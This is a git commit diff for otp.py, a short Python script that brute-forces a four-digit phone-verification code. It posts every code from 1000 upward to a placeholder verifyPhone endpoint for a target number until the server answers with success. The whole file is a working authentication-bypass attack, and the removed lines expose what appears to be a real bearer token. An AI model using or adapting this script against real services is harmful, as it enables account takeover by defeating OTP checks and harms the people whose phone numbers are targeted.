4441632afcbdef3c86a5ab23a8e1501dcaa9c885
yousef <54207974+7hj4@users.noreply.github.com>
2021-08-01 16:54:16 +0300

    Update otp.py

--- otp.py
+++ otp.py
@@ -4,32 +4,35 @@ import requests
 import os
 import json
 import sys
+import time
 
 # clean screen
 os.system("cls")
 os.system("clear")
 
-logo = '''
-                 ########################################
-                    ------- Devloper by Yousef -----------
-                           Twitter : y0usef_11
-                 ########################################
-'''
+# open session here connect 
 
-print (logo)
+session = requests.Session()
 
-for i in range(1000, 9999):
+start = time.time()
+
+for i in range(1000,9999):
     # loops Guess the numbers
     number = "{:04d}".format(i)
+   
+    url = "https://sites-here/verifyPhone"
+    data = {"data":{"mobileNumber":"00000000000000000","code":number}} # enter number for change
+    header = {"Content-Type" : "application/json"}
 
-    url = "https://example"
-    data = {'code': number ,'PhoneNumber':"00000000000"} # enter number for change
-    header = {"Content-Type" : "application/json" , "Authorization" : "Bearer TEZTApFI9Ziucpdj1ndK_0bGLRHAFNdcSPWCP1X61Wz2iitVDERG8ZE"}
-
-    re = requests.post(url , data=json.dumps(data) , headers=header)
-
-    if re.status_code == 200:
-        print ("[+] otp is catch" , "otp number" , i ,"Satus code is" ,re.status_code)
-        sys.exit(0)
-    else :
-        print ("[-] otp Not same " , "otp number" ,i ,"Satus code is" ,re.status_code)
+    request = session.post(url , data=json.dumps(data) , headers=header)
+    
+    re = request.text
+    
+    if request.status_code == 200:
+        if "success" in re:
+            print ("[+] OTP Number "+ str(i) + " success")
+            print("took script run on " ,time.time() - start)
+            sys.exit(0)
+        else: 
+             print ("[-] OTP Number "+ str(i) + " Failure")
+print("took script run on " ,time.time() - start)        
